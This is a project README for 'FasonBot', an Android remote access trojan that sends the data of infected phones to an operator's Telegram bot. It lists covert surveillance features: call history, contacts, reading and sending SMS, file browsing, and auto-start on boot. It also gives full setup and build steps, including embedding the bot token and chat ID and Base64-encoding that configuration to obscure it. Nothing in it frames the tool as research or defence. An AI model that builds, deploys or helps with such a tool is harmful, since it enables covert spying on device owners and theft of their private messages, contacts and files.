# FasonBot

A serverless Android Rat for control devices.
No server required - direct communication.

---

## Features

- View call history  
- Access contacts  
- Read and send SMS 
- Browse and manage files  
- Control multiple devices from one bot  
- Auto-start on boot and network connection  

---

## Setup

### 1. Create a Telegram Bot

1. Open Telegram and search **@BotFather**  
2. Send `/newbot` and follow the steps 
3. Copy your **Bot Token**

---

### 2. Get Chat ID

1. Send a message to your bot 
2. Open in browser:
`https://api.telegram.org/bot<YOUR_TOKEN>/getUpdates`
3. Find:
   `"chat":{"id":123456789}`

This is your **Chat ID**

---

## Build APK

### Option 1: GitHub Actions (Recommended)

1. Go to **Actions → Build Android APK**
2. Choose build type:
   - **Release (Recommended)**
   - Debug
3. Enter your:
   - App Name (Optional)
   - Telegram `BotToken`
   - Telegram `ChatID`
5. Run the workflow
6. Download the APK from **Artifacts**

---

### Option 2: Android Studio

#### Requirements

- Android Studio
- JDK 17
- Android SDK 34

#### Steps

1. **Clone the repository**
   ```bash
   git clone https://github.com/fahimahamed1/FasonBot.git
   cd FasonBot
   ```
Open in Android Studio and wait for sync.

---

### Configure Credentials

Edit:
`app/src/main/java/com/fasonbot/app/config/BotConfig.kt`

Quick setup:
```kotlin
private const val BOT_TOKEN = "YOUR_BOT_TOKEN"
private const val CHAT_ID = "YOUR_CHAT_ID"
```
Or Base64 encoded: (recommended)
```kotlin
// Generate base64: echo -n '{"botToken":"TOKEN","chatId":"ID"}' | base64
   private const val CONFIG_DATA = "eyJib3RUb2tlbiI6IlRPS0VOIiwiY2hhdElkIjoiSUQifQ=="
```
---

### Build
   - Build → Build Bundle(s) / APK(s) → Build APK(s)
   - Or run: `./gradlew assembleDebug`  or `./gradlew assembleRelease`

---

## Commands

| Command   | Description   |
|-----------|--------------|
| /start    | Open menu     |
| /status   | Device info   |
| /help     | Help list     |

---

## Requirements

- Android 9+ (API 28) to Android 15+ (API 34)
- Permissions: SMS, Contacts, Storage, Phone, Camera, Location

---

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

## 👨‍💻 Author

**Fahim Ahamed**

[![GitHub](https://img.shields.io/badge/GitHub-fahimahamed1-181717?style=flat-square&logo=github)](https://github.com/fahimahamed1)

---

## ⭐ Support

If you find this project useful, please consider giving it a star! 🌟 We'd be happy to receive contributions, issues, or ideas.

---
